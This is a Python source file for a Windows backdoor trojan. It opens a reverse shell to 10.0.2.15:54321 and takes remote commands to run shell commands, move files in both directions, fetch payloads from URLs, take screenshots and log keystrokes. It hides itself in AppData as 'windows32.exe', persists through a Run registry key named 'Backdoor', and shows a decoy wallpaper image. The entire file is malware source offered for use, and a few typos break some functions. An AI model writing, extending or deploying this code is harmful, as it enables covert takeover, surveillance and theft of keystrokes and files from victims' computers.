#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
import ctypes
import threading
import keylogger
from mss import mss


def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)

def reliable_recv():
        json_data = ""
        while True:
                try:
                        json_data = json_data + sock.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue
def has_admin ():
	global admin
	try:
		temp = os.listdr(os.sep.join([os.environ.get('SystemRoot','C:\\windows'), 'temp']))
	except:
		admin = "User Priviliges"
	else:
		admin = "Administrato Privileges"
def screenshot():
	with mss() as screenshot:
		screenshot.shot()

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def connection():
	while True:
		time.sleep(20)
		try:
			sock.connect(("10.0.2.15",54321))
			shell()
		except:
			connection()

def shell():
	while True:
		command = reliable_recv()
		if command == "q":
			try:
				os.remove(keylogger_path)
			except:
				continue
			break
		elif command == "help":
			help_options = '''download path  -> Download a file from target PC
					  upload path    -> upload a file to atarget PC
					  get url        -> Download File to target from any website
					  start path 	 -> start program on target PC
					  screenshot 	 -> Take a screenshot of Targets Monitor
					  keylog_start   -> Start keylogger on target PC
					  keylog_dump    -> Print out Key Strokes captured by Keylogger
					  check 	 -> Check for administrator Privileges
					  q 		 -> Exit the Reverse Shell'''
			reliable_send(help_options)
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] == "download":
			with open(command[9:], "rb") as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] == "upload":
			with open(command[7:], "wb") as fin:
				result = reliable_recv()
				fin.write(base64.b64encode(result))
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+] Downloaded File from specified URL!")
			except:
				relibale_send("[!!] Failed to download file from specified URL!")
		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("[+] Started!")
			except:
				reliable_send("[!!] Failed to Start!")
		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open("monitor-1.png","rb") as sc:
					reliable_send(base64.b64encode(sc.read()))
				os.remove("monitor-1.png")
			except:
				reliable_send("[!!] Failed to take screenshot")
		elif command[:5] == "check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("Cant perform the Check")
		elif command[:12] == "keylog_start":
			t1 = threading.Thread(target=keylogger.start)
			t1.start()
		elif command[:11] == "keylog_dump":
			fn = open(keylogger_path, "r")
			reliable_send(fn.read())
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				reliable_send(result)

			except:
				reliable_send("[!!] Cant Execute That Command")

keylogger_path = os.environ["appdata"] + "\\processManager.txt"
location = os.environ["appdata"] + "\\windows32.exe"
if not  os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + ' " ', shell=True)

	name = sys._MEIPASS + "\Dragon-Wallpaper-Chinese.jpg"
	try:
		subprocess.Popen(name,shell=True)
	except:
		number = 3
		number1 = 5
		addition = number + number1
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()
